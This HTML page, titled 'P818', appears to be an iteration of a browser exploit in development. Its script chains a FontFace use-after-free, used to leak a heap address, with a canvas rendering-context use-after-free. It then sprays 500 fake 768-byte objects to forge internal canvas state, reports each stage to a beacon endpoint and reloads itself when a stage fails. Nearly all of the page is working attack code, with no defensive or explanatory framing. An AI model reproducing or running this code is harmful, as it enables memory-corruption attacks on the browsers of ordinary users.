<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P818</title>
<style>
body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
.ok{color:#3fb950;} .fail{color:#f85149;} .info{color:#58a6ff;} .hot{color:#ffa657;}
</style>
</head><body>
<pre id="o">P818: pure-zero AB isolation — is the crash m_canvas or CanvasStyle?</pre>
<script>
'use strict';
var O=document.getElementById('o');
function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}

function syncBn(t,d){
  try{
    var x=new XMLHttpRequest();
    x.open('GET','/beacon.php?tag=P818-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
    x.send();
  }catch(e){}
}

/* ========== FontFace UAF → H ========== */
var st=document.createElement('style');
st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);
var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs=[],ffired=false;
Object.defineProperty(FontFace.prototype,'then',{
  configurable:true,
  get:function(){
    if(ffired)return undefined;
    ffired=true;
    if(st){st.remove();st.textContent='';st=null;}
    try{document.fonts.delete(this);}catch(e){}
    document.body.offsetHeight;
    fabs=[];
    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
    try{document.fonts.check('1em bb1');}catch(e){}
    document.body.offsetHeight;
    return undefined;
  },set:function(){}
});
document.fonts.load('1em f1, bb1','AB');

setTimeout(function(){
  delete FontFace.prototype.then;

  var bestI=-1,bestNz=0;
  for(var i=0;i<fabs.length;i++){
    var u=new Uint8Array(fabs[i]),nz=0;
    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
    if(nz>bestNz){bestNz=nz;bestI=i;}
  }
  if(bestI<0||bestNz<4){
    syncBn('FONT-MISS','nz='+bestNz);
    setTimeout(function(){location.reload();},200);
    return;
  }

  var fontAB=fabs[bestI];
  var fontDV=new DataView(fontAB);
  var q11lo=fontDV.getUint32(0x58,true);
  var q11hi=fontDV.getUint32(0x5C,true);
  if(q11hi===0){
    syncBn('FONT-BAD','q11hi=0');
    setTimeout(function(){location.reload();},200);
    return;
  }
  var borrow=(q11lo<0x68)?1:0;
  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);

  syncBn('FONT-OK','H='+Hstr);
  log('H = '+Hstr,'ok');

  /* H = ALL ZEROS. Pure zero State:
   * globalAlpha=0 (transparent), fillStyle=zero-Color, lineWidth=0, etc.
   * The goal: isolate whether the crash is from bad CanvasStyle data
   * or from m_canvas=0 being dereferenced. */
  var fontU8=new Uint8Array(fontAB);
  for(var i=0;i<192;i++)fontU8[i]=0;

  /* ========== Canvas UAF ========== */
  var innerCtx=null;
  var canvas=document.createElement('canvas');
  canvas.width=1;canvas.height=1;
  var opts={};
  Object.defineProperty(opts,'alpha',{
    get:function(){
      innerCtx=canvas.getContext('2d');
      return true;
    }
  });
  canvas.getContext('bitmaprenderer',opts);

  if(!innerCtx){
    syncBn('UAF-FAIL','');
    setTimeout(function(){location.reload();},200);
    return;
  }
  syncBn('UAF-OK','');

  /* ========== AB(768) spray — PURE ZEROS except m_stateStack ========== */
  /* Test A: m_canvas=0, State=all-zeros
   * If this crashes → m_canvas=0 is the cause
   * If survives → CanvasStyle encoding was the cause in P816v2/P817 */
  var SPRAY=500;
  var abs768=[];
  for(var s=0;s<SPRAY;s++){
    var ab=new ArrayBuffer(768);
    var dv=new DataView(ab);
    /* ONLY set m_stateStack: buffer=H, cap=1, size=1 */
    dv.setUint32(112, H_lo, true);
    dv.setUint32(116, H_hi, true);
    dv.setUint32(120, 1, true);
    dv.setUint32(124, 1, true);
    /* Everything else = 0: m_canvas=0, vtable=0, etc. */
    abs768.push(ab);
  }

  syncBn('SPRAY','n='+SPRAY+'|mcanvas=0|state=allzero');

  /* ========== READ ATTEMPTS ========== */
  /* NO sync XHR between spray and reads (avoid any GC trigger) */
  var fsV='CRASH', gaV='CRASH', lwV='CRASH';
  var fsOk=false, gaOk=false, lwOk=false;

  try{ fsV=innerCtx.fillStyle; fsOk=true; }catch(e){ fsV='ERR:'+e.message; }
  syncBn('FS','ok='+fsOk+'|v='+fsV);

  try{ gaV=innerCtx.globalAlpha; gaOk=true; }catch(e){ gaV='ERR:'+e.message; }
  syncBn('GA','ok='+gaOk+'|v='+gaV);

  try{ lwV=innerCtx.lineWidth; lwOk=true; }catch(e){ lwV='ERR:'+e.message; }
  syncBn('LW','ok='+lwOk+'|v='+lwV);

  syncBn('RESULT','fs='+fsOk+'|ga='+gaOk+'|lw='+lwOk);
  syncBn('DONE','ok');

  log('fillStyle: '+fsV+' ['+fsOk+']', fsOk?'ok':'fail');
  log('globalAlpha: '+gaV+' ['+gaOk+']', gaOk?'ok':'fail');
  log('lineWidth: '+lwV+' ['+lwOk+']', lwOk?'ok':'fail');

  if(fsOk||gaOk||lwOk){
    log('*** SURVIVED! CanvasStyle encoding was the crash cause ***','hot');
  }

  for(var c=0;c<abs768.length;c++){
    var u8=new Uint8Array(abs768[c]);
    for(var z=0;z<768;z++)u8[z]=0;
  }

},600);
</script></body></html>
